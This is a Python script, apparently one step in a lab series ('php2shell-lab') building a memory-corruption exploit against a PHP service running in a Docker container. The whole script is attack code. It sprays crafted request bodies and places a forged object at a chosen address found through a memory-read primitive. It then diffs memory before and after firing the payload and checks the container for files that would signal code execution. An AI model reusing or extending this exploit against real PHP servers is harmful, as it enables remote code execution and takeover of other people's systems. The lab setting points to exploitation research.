#!/usr/bin/env python3
"""oom113: oom112 (boundary-fixed, verified block) + PRE/POST DIFF.

oom112 proved: fat bodies parse (Fatal), block live at OBJ
(rc=1 ti=0x108 readback OK), fires silent. Decisive question:
does the teardown touch the block at all? Diff [OBJ-64, OBJ+240]
around a fire; any changed qword = the walk's footprint.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

exec(open("/Users/vlad/Projects/queue/php2shell-lab/oom112.py").read().split('print("=== oom112')[0])

print("=== oom113: diff the walk footprint ===", flush=True)
for i in range(20):
    post_x(WARM)

mbody = P.build_attack(3400, 0x41414141, value_tile=MARKER + b"M" * 1513)
code, resp = post_bound(mbody)
print("fat-m: (%s) %r" % (code, "Fatal" in resp), flush=True)

offs = probe_scan(MARKER)
assert len(offs) >= 2, offs
b0v = offs[0]
stride = offs[1] - offs[0]
print("b0v=0x%x stride=%d copies=%d" % (b0v, stride, len(offs)), flush=True)

OBJ = None
for i in range(0, min(24, len(offs))):
    for BOFF in range(200, TILE - 176):
        cand = offs[i] + BOFF
        if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1 and ((cand >> 9) & 1) == 0:
            OBJ, BOFF_USE = cand, BOFF
            break
    if OBJ:
        break
print("OBJ=0x%x copy=%d BOFF=%d" % (OBJ, i, BOFF_USE), flush=True)

T = bytearray(TILE)
for off in list(range(0, BOFF_USE, 8)) + list(range(BOFF_USE + 176, TILE - 8, 8)):
    struct.pack_into("<Q", T, off, OBJ)
T[BOFF_USE:BOFF_USE + 176] = obj_block(OBJ)
abody = P.build_attack(3400, 0x41414141, target_obj=OBJ, value_tile=bytes(T))
code, resp = post_bound(abody)
print("fat-aim: Fatal=%s" % ("Fatal" in resp), flush=True)

d = probe_read(OBJ, 8)
rc, ti = struct.unpack("<II", d)
print("readback: rc=%d ti=0x%x" % (rc, ti), flush=True)
assert (rc, ti) == (1, 0x108)

# PRE snapshot
LO, HI = -64, 176 + 64
def snap():
    out = {}
    for off in range(LO, HI, 8):
        dd = probe_read(OBJ + off, 8)
        out[off] = struct.unpack("<Q", dd)[0] if dd else None
    return out

PRE = snap()
print("pre: %d/%d readable" % (sum(v is not None for v in PRE.values()), len(PRE)), flush=True)

code, resp = post_bound(abody)
print("fire: Fatal=%s" % ("Fatal" in resp), flush=True)

POST = snap()
CH = [(o, PRE[o], POST[o]) for o in PRE
      if PRE[o] is not None and POST[o] is not None and PRE[o] != POST[o]]
print("changed qwords: %d" % len(CH), flush=True)
for (o, a, b) in CH:
    print("  %+5d: 0x%016x -> 0x%016x" % (o, a, b), flush=True)
if not CH:
    print("NO CHANGES -> teardown never touched the block region", flush=True)

x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x /tmp/core 2>&1'")
print("x:", x.strip(), flush=True)
